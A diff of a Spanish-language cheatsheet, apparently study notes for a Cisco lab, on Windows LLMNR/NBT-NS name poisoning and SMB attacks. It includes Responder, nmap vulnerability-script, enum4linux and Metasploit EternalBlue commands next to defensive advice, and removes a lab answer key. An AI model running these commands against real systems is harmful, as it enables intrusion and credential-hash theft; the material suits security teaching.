@@ -370,34 +370,8 @@ Aplicar parches	Corregir vulnerabilidades	MS17-010 y posteriores
 Políticas de contraseñas	Dificultar fuerza bruta	Longitud mínima 8, complejidad, bloqueo
 Monitoreo	Detectar ataques	IDS/IPS, logs, SIEM
 Autenticación fuerte	Evitar sesiones nulas	Requerir autenticación en SMB
-📝 12. RESPUESTAS PARA EL LABORATORIO DE CISCO
-Pregunta: "¿Qué utilidades de Samba utiliza enum4linux?"
 
-Respuesta: rpcclient, net, nmblookup y smbclient.
-Pregunta: "¿Qué revela Nmap sobre los hosts en 172.17.0.0/24?"
-
-Respuesta: Solo hay un host con posibles puertos SMB: 172.17.0.2.
-Pregunta: "¿Qué puertos están abiertos en el host?"
-
-Respuesta: 139/tcp filtered netbios-ssn y 445/tcp filtered microsoft-ds (están filtrados, no abiertos).
-Pregunta: "¿Cómo calificaría la seguridad de la política de contraseñas?"
-
-Respuesta: ALTA. No permite tráfico, ni identificación de políticas de seguridad.
-Pregunta: "¿Qué pasos seguiría para enviar un archivo de malware?"
-
-Respuesta: 1. Escanear red con Nmap → 2. Enumerar con enum4linux → 3. Conectar con smbclient → 4. Usar put para subir el archivo.
-Pregunta: "¿Qué error da smbclient y qué significa?"
-
-Respuesta: NT_STATUS_IO_TIMEOUT - El servidor no respondió (firewall bloquea).
-📌 13. REFLEXIÓN FINAL
-
-    Un servidor con puertos FILTRADOS y que RECHAZA sesiones anónimas tiene un nivel de seguridad ALTO. No es vulnerable a enumeración SMB sin credenciales.
-
-    Un servidor con puertos ABIERTOS y que PERMITE sesiones anónimas tiene un nivel de seguridad BAJO. Es vulnerable a enumeración y posible explotación.
-
-    La resolución de nombres en Windows (NetBIOS/LLMNR) es un vector de ataque crítico porque NO tiene autenticación y permite suplantación de identidad.
-
-📂 14. INSTALACIÓN DE HERRAMIENTAS
+📂 12. INSTALACIÓN DE HERRAMIENTAS
 bash
 
 # Instalar enum4linux
@@ -416,7 +390,7 @@ sudo apt-get install exploitdb
 git clone https://github.com/lgandx/Responder.git
 cd Responder
 
-🎯 15. EJEMPLO DE ANÁLISIS COMPLETO PARA INFORME
+🎯 13. EJEMPLO DE ANÁLISIS COMPLETO PARA INFORME EN LABORATORIO
 text
 
 ANÁLISIS DE SEGURIDAD - HOST 172.17.0.2
@@ -443,8 +417,6 @@ RECOMENDACIÓN:
 - Si se necesitara acceso, buscar credenciales válidas o intentar evasión de firewall
 - Considerar que el servidor está correctamente asegurado
 
-¡Este cheatsheet cubre TODO el material sobre resolución de nombres en Windows y ataques SMB! Puedes guardarlo como windows-naming-smb-attacks.md en VS Code. 🚀
-
 # 🪟 Resolución de Nombres en Windows y Ataques SMB
 
 ## 📌 Conceptos Clave
@@ -460,7 +432,7 @@ RECOMENDACIÓN:
 
 ## 🚨 Ataques Comunes
 
-### Envenenamiento de LLMNR/NBT-NS
+### Envenenamiento de LLMNR/NBT-NS (EJEMPLO EXPLICATIVO)
 1. La víctima pregunta por un recurso (ej: "¿dónde está la impresora?")
 2. El atacante responde: "¡yo soy la impresora!"
 3. La víctima envía usuario + hash NTLMv2 al atacante
@@ -473,7 +445,6 @@ RECOMENDACIÓN:
 5. El atacante captura el hash y lo descifra offline
 
 **Herramientas:**
-```bash
 responder -I eth0 -wrf
 nbns_spoof.py
 metasploit
@@ -487,15 +458,13 @@ Usado por WannaCry y Nyetya
 
 En Metasploit:
 
-bash
 msf6 > use exploit/windows/smb/ms17_010_eternalblue
 msf6 > set RHOST 192.168.1.100
 msf6 > set LHOST 192.168.1.50
 msf6 > exploit
 
-🔍 Enumeración SMB
-Con Nmap
-bash
+🔍 Enumeración SMB Con Nmap
+
 nmap -p 445 --script smb-os-discovery 192.168.1.0/24
 nmap -p 445 --script smb-vuln-* 192.168.1.100
 
@@ -504,7 +473,7 @@ bash
 enum4linux -a 192.168.1.100
 
 Con SearchSploit
-bash
+
 searchsploit smb
 searchsploit eternalblue
 
@@ -525,7 +494,6 @@ Enum4linux	Enumeración de recursos SMB
 SearchSploit	Buscar exploits en la base de datos
 
 🧪 Ejemplo Rápido: EternalBlue con Metasploit
-bash
 # 1. Iniciar Metasploit
 msfconsole
 
@@ -550,18 +518,6 @@ msf6 > exploit
 
 🛡️ SMBv1 está deprecado → deshabilitarlo en todos los sistemas modernos
 
-📋 Monitoreo continuo es clave para detectar envenenamiento de nombres
-
-🔗 Recursos Útiles
-SearchSploit
-
-Metasploit Unleashed
-
-Responder GitHub
-
-text
-
----
 
 ## 🎯 Resumen Visual Rápido
 📡 RESOLUCIÓN DE NOMBRES EN WINDOWS
@@ -584,12 +540,6 @@ text
 ├── 🔹 Bloquear UDP 137 y UDP 5355
 ├── 🔹 Monitorear registro de Windows
 └── 🔹 Aplicar parches de seguridad (MS17-010)
-
-text
-
----
-
-Con esto ya tienes una explicación clara y un cheatsheet listo para usar en VS Code. ¿Quieres que profundice en alguna parte en específico o necesitas algo más?
 
 
 ## 🎯 Envenenamiento LLMNR/NBT-NS = Suplantación de identidad en protocolos antiguos
@@ -614,8 +564,8 @@ Un ataque donde el atacante responde a las consultas de resolución de nombres e
 4. Usar DNS en lugar de NetBIOS/LLMNR
 5. Implementar SMB con firma (evita manipulación)
 
-### 🔹 Analogía
-Es como un estafador que responde "yo soy el banco" cuando preguntas por teléfono, y tú le das tu contraseña porque confías en su voz.
+### 🔹 Analogía para entender el proceso
+Es como un estafador que responde "yo soy el banco" cuando se pregunta por teléfono, y yo le entrego la contraseña porque confío en su voz.
 
 # 🖥️ CHEATSHEET: CÓMO LEER LA TERMINAL EN CIBERSEGURIDAD
 
@@ -763,5 +713,3 @@ Es como un estafador que responde "yo soy el banco" cuando preguntas por teléfo
 - `dig <dominio>` → Consulta DNS detallada
 - `whois <dominio>` → Información de registro del dominio
 - `curl -I <URL>` → Ver cabeceras HTTP de un sitio
-
-## 🔹 EJEMPLO COMPLETO DE ATAQUE (paso a paso)
